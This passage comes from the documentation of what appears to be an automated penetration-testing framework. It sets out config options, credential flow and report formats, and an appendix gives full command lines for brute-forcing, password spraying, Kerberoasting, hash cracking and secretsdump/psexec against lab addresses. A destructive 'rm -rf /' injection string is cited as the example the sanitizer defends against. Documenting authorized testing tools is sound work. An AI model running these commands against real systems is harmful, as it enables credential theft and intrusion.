From `test_cve_extraction`: The scorer extracts CVE IDs from NSE script output using the regex `CVE-\d{4}-\d{4,}` (case-insensitive). The test confirms that `CVE-2017-0144` is extracted from the sample nmap data containing `"VULNERABLE: CVE-2017-0144"` in the `smb-vuln-ms17-010` script output.

### F.10 VulnScorer: Findings Sorting

From `test_findings_sorted_by_severity`: `get_findings()` returns findings sorted by severity descending (CRITICAL first), then by CVSS score descending within the same severity level. The `Severity.numeric` property provides the sort weight: CRITICAL=4, HIGH=3, MEDIUM=2, LOW=1, INFO=0.

### F.11 Report Secret Masking

From `test_report_data_masks_secrets`: When exporting credential data for reports via `to_report_data()`, passwords are masked to show only the first 2 and last 1 character (e.g., `"Su*****************3"`). Hashes show the first 6 and last 4 characters. The original secret is never included in report output.

### F.12 Session Checkpoint Phases

From `test_should_skip_completed`: The `_completed_phases` list in the checkpoint is additive — calling `save_checkpoint(results, "recon")` followed by `save_checkpoint(results, "scan")` results in `["recon", "scan"]`. The `should_skip_phase()` method checks membership in this list.

---

## Appendix G: Nmap User Override Examples

### G.1 Extra Mode (Append flags)

Add UDP scanning to the default SYN scan:

```yaml
nmap_user_opts:
  extra: ["-sU", "-Pn", "--max-rate", "200"]
```

Resulting command: `nmap -sS -sV -sC -O -T4 --reason --open --min-rate 300 --max-retries 2 --host-timeout 5m -oX {xml} -oN {nmap} -p 1-65535 {ip} -sU -Pn --max-rate 200`

### G.2 Raw Mode (Replace all defaults)

Use a completely custom scan profile:

```yaml
nmap_user_opts:
  raw: ["-sT", "-sV", "--script", "banner,http-title", "-Pn"]
```

Resulting command: `nmap -sT -sV --script banner,http-title -Pn -oX {xml} -oN {nmap} -p 1-65535 {ip}`

### G.3 Scan Type Override

Switch from SYN scan (requires root) to full-connect scan (non-root):

```yaml
nmap_user_opts:
  scan_type: "-sT"
```

When `-sT` is used, the framework automatically excludes `-O` (OS detection) since it's incompatible with non-root scan types. The `rootless_scan_types` set in `_detailed_scan()` defines which scan types trigger this behavior.

### G.4 Custom NSE Scripts

Override the vulnerability scan script selection:

```yaml
nmap_user_opts:
  scripts: "smb-vuln*,ssl-heartbleed,http-shellshock"
```

This replaces the default `nmap.scripts` config value during the `_vuln_scan()` phase.

---

## Appendix H: Inter-Module Credential Flow

This diagram shows how credentials flow between phases via the vault:

```
Enumeration Module
  └─ _enum_snmpv3() discovers SNMPv3 auth creds
     └─ credential_vault.add_password(service="snmpv3", source_phase="enum")

Exploitation Module
  └─ _hydra_attack() brute-forces SSH/SMB/FTP creds
     └─ Results returned as exploit.credentials list
     └─ (Not auto-stored in vault; consumed by AD/Post modules directly)

Active Directory Module
  └─ _asrep_roast() extracts AS-REP hashes
     └─ credential_vault.add_hash(hash_type=CredType.ASREP_HASH, source_phase="ad")
  └─ _kerberoast() extracts TGS hashes
     └─ Written to loot/kerberoast_{dc_ip}.txt (collected by CrackingModule)
  └─ _password_spray() finds valid AD creds
     └─ Logged but stored via exploit data flow

Cracking Module
  └─ _collect_hashes() reads from:
     ├─ credential_vault.get_hashes() (NTLM, NTLMv2, ASREP, TGS)
     └─ loot/ directory files (asrep_hashes_*.txt, kerberoast_*.txt, secretsdump_*.ntds)
  └─ _store_cracked() writes back:
     └─ credential_vault.add_password(source_phase="crack", source_tool="hashcat/john")

Post-Exploitation Module
  └─ _impacket_operations() uses exploit.credentials for:
     ├─ secretsdump (hash extraction → more hashes for cracking)
     └─ psexec (shell validation)
  └─ _kerberos_attacks() re-runs AS-REP/Kerberoast with accumulated data
```

---

## Appendix I: Framework Configuration Class API

The `FrameworkConfig` class (`configs/settings.py`) provides a unified configuration interface:

### Constructor

```python
config = FrameworkConfig(config_path="configs/mylab.yaml")
# Or with defaults only:
config = FrameworkConfig(None)
```

If the YAML file has parse errors or permission issues, the error is logged and defaults are used.

### Methods

**`config.get(section, key=None, default=None)`**

Retrieve a configuration value. If `key` is `None`, returns the entire section dict.

```python
config.get("nmap", "timing_template", default=4)  # → 4
config.get("nmap", "scripts", default=[])          # → ["default", "vuln", "safe"]
config.get("enumeration", default={})              # → entire enumeration section dict
config.get("nonexistent", "key", default="fallback")  # → "fallback"
```

**`config.set(section, key=None, value=None)`**

Set a configuration value at runtime.

```python
config.set("nmap", "timing_template", 2)
config.set("nmap_user_opts", value={"extra": ["-Pn"]})
```

**`config.get_tool_path(tool_name)`**

Returns the configured binary path for a tool, or the tool name itself if no override exists.

```python
config.get_tool_path("nmap")  # → "nmap" (or "/usr/local/bin/nmap" if overridden)
```

**`config.to_dict()`**

Returns the full configuration as a plain dictionary. Useful for serialization.

### Default Tool Paths (`DEFAULT_TOOL_PATHS`)

The following tools have configurable paths in the `tool_paths` config section:

```python
{
    "nmap": "nmap", "masscan": "masscan", "nikto": "nikto",
    "enum4linux": "enum4linux-ng", "gobuster": "gobuster",
    "hydra": "hydra", "snmpwalk": "snmpwalk",
    "onesixtyone": "onesixtyone", "whatweb": "whatweb",
    "smbclient": "smbclient", "rpcclient": "rpcclient",
    "dig": "dig", "whois": "whois", "searchsploit": "searchsploit",
    "msfconsole": "msfconsole", "crackmapexec": "crackmapexec",
    "responder": "responder", "john": "john", "hashcat": "hashcat",
    "impacket_secretsdump": "impacket-secretsdump",
    "impacket_psexec": "impacket-psexec",
    "impacket_smbexec": "impacket-smbexec",
    "impacket_wmiexec": "impacket-wmiexec",
    "impacket_getTGT": "impacket-getTGT",
    "impacket_GetNPUsers": "impacket-GetNPUsers",
    "impacket_GetUserSPNs": "impacket-GetUserSPNs",
}
```

Override example in YAML:
```yaml
tool_paths:
  nmap: /usr/local/bin/nmap
  enum4linux: /opt/enum4linux-ng/enum4linux-ng.py
```

---

## Appendix J: Report Format Details

### J.1 HTML Report Theme

The HTML report uses a dark theme with the following color scheme:
- Background: `#0a0a1a`
- Text: `#e0e0e0`
- Headers: `#00d4ff` (cyan) for H1, `#ff6b6b` (red) for H2, `#ffd93d` (yellow) for H3
- Table header: `#16213e` background, `#00d4ff` text
- Alternating rows: `#0f3460`

Severity badge colors:
- CRITICAL: `#ff1744`
- HIGH: `#ff6b6b`
- MEDIUM: `#ffd93d`
- LOW: `#69f0ae`
- INFORMATIONAL: `#4fc3f7`

Finding rows use left-border color coding matching severity.

### J.2 Markdown Report Structure

The markdown report includes these sections in order:
1. **Header** — Session ID, start/end time, targets, mode
2. **Executive Summary** — Risk rating badge, severity breakdown table, attack narrative blockquote, priority recommendations (6 items)
3. **Vulnerability Findings** — Table with top 50 findings: #, Severity, CVSS, Host:Port, Title, Remediation
4. **Credential Vault** — Stats summary, table with top 30 credentials (secrets masked)
5. **Network Scanning** — Per-host sections with OS info and port tables
6. **Service Enumeration** — Per-host, per-service details
7. **Web Application Testing** — Per-URL results with missing headers, detected frameworks, SQLi findings
8. **Active Directory** — Domain info, DC list, per-DC results (LDAP, AS-REP, Kerberoast, SMB signing)
9. **Exploitation Results** — Exploit match table, recovered credentials
10. **Password Cracking Results** — Status, hash counts, cracked passwords (masked)
11. **Evidence Screenshots** — URL-to-path listing

### J.3 PDF Generation Fallback Chain

1. **WeasyPrint** (Python): `HTML(filename=str(html_path)).write_pdf(str(pdf_path))`
2. **wkhtmltopdf** (CLI): `wkhtmltopdf --quiet --enable-local-file-access {html} {pdf}`
3. **Chrome/Chromium headless**: `{chrome} --headless --disable-gpu --no-sandbox --print-to-pdf={pdf} {html}`
4. **None available**: Warning logged with install instructions for all three options.

---

## Appendix K: BaseModule Complete API Reference

All 8 phase modules inherit from `BaseModule` and share these attributes and methods:

### Constructor Parameters

| Parameter | Type | Description |
|---|---|---|
| `config` | `FrameworkConfig` | Configuration object |
| `targets` | `List[str]` | Target IPs/CIDRs/hostnames |
| `exclusions` | `List[str]` | IPs/ranges to exclude |
| `session_dir` | `Path` | Session output directory |
| `dry_run` | `bool` | If True, tools are not actually executed |
| `verbose` | `int` | Verbosity level (0=normal, 1=verbose, 2=debug) |
| `credential_vault` | `CredentialVault` | Shared credential store (optional) |
| `vuln_scorer` | `VulnScorer` | Shared vulnerability scorer (optional) |
| `scope_guard` | `ScopeGuard` | Scope enforcement (optional) |

### Inherited Attributes

| Attribute | Type | Description |
|---|---|---|
| `self.runner` | `ToolRunner` | Pre-configured tool execution engine |
| `self.parallel` | `ParallelRunner` | Thread pool runner (workers from `general.threads`) |
| `self.results` | `Dict[str, Any]` | Initialized to `{"status": "pending"}` |

### Inherited Methods

| Method | Signature | Description |
|---|---|---|
| `_get_open_ports_for_host(host_data)` | `Dict → Dict[int, Dict]` | Filters host ports to only `state=="open"`, returns `{port_num: port_data}` |
| `_get_hosts_with_service(scan_results, service_name)` | `Dict, str → List[Dict]` | Finds all hosts with a service matching `service_name` (case-insensitive substring match). Returns list of `{ip, hostname, port, service}`. |
| `_store_credential(**kwargs)` | Keyword args → None | Stores cleartext credential in vault; auto-sets `source_phase` |
| `_store_hash(**kwargs)` | Keyword args → None | Stores hash credential in vault; auto-sets `source_phase` |
| `_score_finding(**kwargs)` | Keyword args → `Optional[Finding]` | Scores a misconfiguration via `vuln_scorer.score_misconfiguration()`; auto-sets `source_phase` |
| `log_phase_start(phase)` | `str → None` | Logs `[{MODULE_NAME}] Starting {phase}...` |
| `log_phase_end(phase, success=True)` | `str, bool → None` | Logs `[{MODULE_NAME}] {phase} completed/failed` |

### Abstract Method

```python
@abstractmethod
def run(self, previous_results: Dict = None) -> Dict[str, Any]:
    """Execute the module's workflow. Must be implemented by each module."""
    pass
```

---

---

## Appendix L: Practical Command-Line Examples per Module

### L.1 Reconnaissance Examples

**DNS enumeration of a domain target:**
The recon module iterates over record types `["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "SRV"]` and runs:
```
dig example.lab A +short +time=5 +tries=2
dig example.lab MX +short +time=5 +tries=2
dig example.lab ANY +noall +answer
```
Output saved to `recon/dns_example.lab_A.txt`, etc.

**Zone transfer check:**
First discovers nameservers via `dig example.lab NS +short`, then for each NS:
```
dig @ns1.example.lab example.lab AXFR +time=5
```
If stdout contains "XFR size", the domain is marked as zone-transfer vulnerable.

**Web fingerprinting:**
```
whatweb http://192.168.1.10 --color=never -a 3 --log-json {session}/recon/whatweb_192.168.1.10_http.json
whatweb https://192.168.1.10 --color=never -a 3 --log-json {session}/recon/whatweb_192.168.1.10_https.json
```

### L.2 Scanning Examples

**Host discovery (ping sweep):**
```
nmap -sn -PE -PP -PS80,443,22,445 -PA80,443 --min-rate 300 -oG {session}/nmap/discovery_192.168.1.0_24.gnmap 192.168.1.0/24
```

**Masscan quick sweep (for CIDR targets):**
```
masscan 192.168.1.0/24 -p 1-65535 --rate 1000 --open-only -oG {session}/nmap/masscan_192.168.1.0_24.gnmap
```

**Detailed scan with defaults (root):**
```
nmap -sS -sV -sC -O -T4 --reason --open --min-rate 300 --max-retries 2 --host-timeout 5m -oX {session}/nmap/scan_192.168.1.10.xml -oN {session}/nmap/scan_192.168.1.10.nmap -p 1-65535 192.168.1.10
```

**Detailed scan without root (user-specified `-sT`):**
```
nmap -sT -sV -sC -T4 --reason --open --min-rate 300 --max-retries 2 --host-timeout 5m -oX {xml} -oN {nmap} -p 1-65535 192.168.1.10
```
Note: `-O` is automatically excluded when scan type is `-sT`.

**Vulnerability scan:**
```
nmap -sV --script default,vuln,safe -p 22,80,443,445 -oX {session}/nmap/vuln_192.168.1.10.xml --host-timeout 10m 192.168.1.10
```

### L.3 Enumeration Examples

**SMB enumeration:**
```
enum4linux-ng 192.168.1.10 -A -oJ {session}/enum/enum4linux_192.168.1.10
smbclient -L //192.168.1.10 -N --no-pass
nbtscan -v 192.168.1.10
rpcclient -U "" -N 192.168.1.10 -c enumdomusers
rpcclient -U "" -N 192.168.1.10 -c enumdomgroups
rpcclient -U "" -N 192.168.1.10 -c getdompwinfo
```

**SNMP enumeration:**
```
onesixtyone 192.168.1.10 -c {session}/enum/snmp_communities.txt
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.1
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2
```

**SNMPv3 noAuthNoPriv test:**
```
snmpwalk -v3 -l noAuthNoPriv -u admin 192.168.1.10 1.3.6.1.2.1.1
```

**SNMPv3 authNoPriv test:**
```
snmpwalk -v3 -l authNoPriv -u admin -a SHA -A admin123 192.168.1.10 1.3.6.1.2.1.1
```

**HTTP enumeration:**
```
curl -s -I -k --connect-timeout 10 --max-time 15 http://192.168.1.10:80
nikto -h http://192.168.1.10:80 -Format txt -o {session}/enum/nikto_192.168.1.10_80.txt -Tuning 123457890abc -timeout 10
gobuster dir -u http://192.168.1.10:80 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 20 -k --no-error -q -o {session}/enum/gobuster_192.168.1.10_80.txt
```

### L.4 Web Application Testing Examples

**ffuf directory brute-force:**
```
ffuf -u http://192.168.1.10:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak,.old,.conf -mc 200,201,204,301,302,307,401,403,405 -fc 404 -t 40 -timeout 10 -o {session}/enum/ffuf_192.168.1.10_80.json -of json -s
```

**sqlmap crawl and test:**
```
sqlmap -u http://192.168.1.10:80 --crawl=2 --batch --random-agent --level=1 --risk=1 --threads=3 --output-dir {session}/enum/sqlmap_192.168.1.10_80 --timeout=15 --retries=1 --forms --smart
```

**Technology detection probes (framework-specific paths):**
```
curl -s -k -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 http://192.168.1.10:80/wp-login.php
curl -s -k -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 http://192.168.1.10:80/.env
curl -s -k -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 http://192.168.1.10:80/.git/HEAD
```

### L.5 Exploitation Examples

**SearchSploit cross-reference:**
```
searchsploit --json --disable-colour "Apache 2.4.49"
searchsploit --json --disable-colour "OpenSSH 8.9"
```

**Hydra brute-force (safe_mode must be false):**
```
hydra -L {session}/exploits/users_192.168.1.10_22.txt -P /usr/share/wordlists/quick_passwords.txt -s 22 -t 4 -f -o {session}/exploits/hydra_192.168.1.10_22.txt -W 30 ssh://192.168.1.10
```

**CrackMapExec null session test:**
```
crackmapexec smb 192.168.1.10 -u "" -p ""
```

### L.6 Active Directory Examples

**LDAP rootDSE query for domain detection:**
```
ldapsearch -x -H ldap://192.168.1.10 -s base -b "" defaultNamingContext
```

**LDAP anonymous user enumeration:**
```
ldapsearch -x -H ldap://192.168.1.10 -b "DC=lab,DC=local" -s sub "(objectClass=user)" sAMAccountName mail memberOf
```

**AS-REP Roasting:**
```
impacket-GetNPUsers lab.local/ -dc-ip 192.168.1.10 -format hashcat -outputfile {session}/loot/asrep_hashes_192.168.1.10.txt -usersfile {session}/loot/asrep_users_192.168.1.10.txt
```

**Kerberoasting:**
```
impacket-GetUserSPNs lab.local/admin:Password1 -dc-ip 192.168.1.10 -request -outputfile {session}/loot/kerberoast_192.168.1.10.txt
```

**BloodHound collection:**
```
bloodhound-python -c All -u admin -p Password1 -d lab.local -dc 192.168.1.10 -ns 192.168.1.10 --zip --output-prefix {session}/loot/bloodhound/bh
```

**Password spraying:**
```
crackmapexec smb 192.168.1.10 -u {session}/loot/spray_users_192.168.1.10.txt -p Password1 -d lab.local --continue-on-success
# Wait 30 seconds...
crackmapexec smb 192.168.1.10 -u {session}/loot/spray_users_192.168.1.10.txt -p Welcome1 -d lab.local --continue-on-success
```

**SMB signing check:**
```
nmap --script smb2-security-mode -p 445 192.168.1.10
```

### L.7 Password Cracking Examples

**Hashcat with NTLM hashes:**
```
hashcat -m 1000 {session}/loot/crack_ntlm_vault.txt /usr/share/wordlists/rockyou.txt --potfile-path {pot} --outfile {out} --outfile-format 2 --runtime 600 --quiet --force -r /usr/share/hashcat/rules/best64.rule
```

**Hashcat with AS-REP hashes:**
```
hashcat -m 18200 {session}/loot/crack_asrep_vault.txt /usr/share/wordlists/rockyou.txt --potfile-path {pot} --outfile {out} --outfile-format 2 --runtime 600 --quiet --force
```

**John the Ripper fallback:**
```
john {session}/loot/crack_ntlm_vault.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT --max-run-time=600
john {session}/loot/crack_ntlm_vault.txt --show --format=NT
```

### L.8 Post-Exploitation Examples

**Secrets dump via Impacket:**
```
impacket-secretsdump admin:Password1@192.168.1.10 -outputfile {session}/loot/secretsdump_192.168.1.10
```

**PSExec shell test:**
```
impacket-psexec admin:Password1@192.168.1.10 whoami
```

**Screenshot capture via gowitness batch:**
```
gowitness scan file -f {session}/evidence/screenshots/urls.txt --screenshot-path {session}/evidence/screenshots/ --timeout 30 --threads 5 --disable-logging
```

---

## Appendix M: Security Considerations

### M.1 Argument Sanitization Pipeline

Every argument to every external tool passes through `sanitize_args()` in `ToolRunner.run()` before subprocess execution. This protects against:

1. **Command injection via hostile banners**: If a service returns a banner containing `; rm -rf /`, the semicolon is stripped before it reaches any tool argument.
2. **Injection via filenames**: If a target has files named with shell metacharacters, path arguments are sanitized.
3. **Null byte injection**: `\x00` bytes are removed.
4. **Newline injection**: `\n` and `\r` are replaced with spaces.

Characters preserved (needed by tools): `-`, `/`, `:`, `@`, `.`, `_`, `~`, `=`, `+`, `,`

### M.2 Scope Enforcement Layers

The framework enforces scope at multiple levels:

1. **ScopeGuard.check()**: Called by `_host_discovery()` for every discovered host
2. **ScopeGuard.check_tool_args()**: Called by `ToolRunner.run()` for every tool execution
3. **BaseModule.exclusions**: Legacy string-based exclusion check in `_host_discovery()`

Violations are logged to both the console (ERROR level) and `scope_violations.json`.

### M.3 Safe Mode Protection

When `exploitation.safe_mode=True` (default):
- Hydra credential attacks are completely skipped
- CrackMapExec brute-forcing is skipped
- AD password spraying is skipped
- Only passive/read-only operations proceed (searchsploit lookups, MSF script generation)

### M.4 Dry Run Mode

When `dry_run=True`:
- All `ToolRunner.run()` calls log the would-be command but do not execute
- Returns a synthetic `ToolResult` with `success=True` and empty output
- Useful for validating scope, config, and workflow without touching any target

---

*Generated from Perfodia v1.1.0 source code. For authorized lab use only.*
